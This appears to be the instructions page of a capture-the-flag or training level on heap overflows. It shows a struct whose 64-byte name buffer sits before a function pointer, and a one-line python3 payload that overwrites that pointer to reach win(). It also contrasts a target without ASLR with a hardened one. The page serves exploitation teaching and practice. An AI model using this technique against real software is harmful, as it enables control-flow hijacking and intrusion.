# Level 3: Heap Overflow

## Objective
Overflow a heap buffer to overwrite an adjacent function pointer and redirect execution to `win()`.

## Background
When a struct is allocated on the heap with a char buffer followed by a function pointer, overflowing the buffer corrupts the pointer. The next call through that pointer jumps to an attacker-controlled address.

## Steps

1. **Understand the layout:**
   ```
   struct Record {
       char name[64];       // offset 0
       void (*action)(void); // offset 64
   };
   ```

2. **Get addresses** (printed by the program):
   ```
   ./vulnerable test
   ```

3. **Craft payload:** 64 bytes of padding + address of `win()`.

4. **Execute:**
   ```
   ./vulnerable $(python3 -c "import sys; sys.stdout.buffer.write(b'A'*64 + b'\xAA\xBB\xCC\xDD\xEE\xFF\x00\x00')")
   ```

## On target-basic vs target-hardened
- **target-basic**: No ASLR — `win()` address is constant
- **target-hardened**: ASLR randomizes heap and code addresses; requires a leak

## Solution
See `exploit.c`.
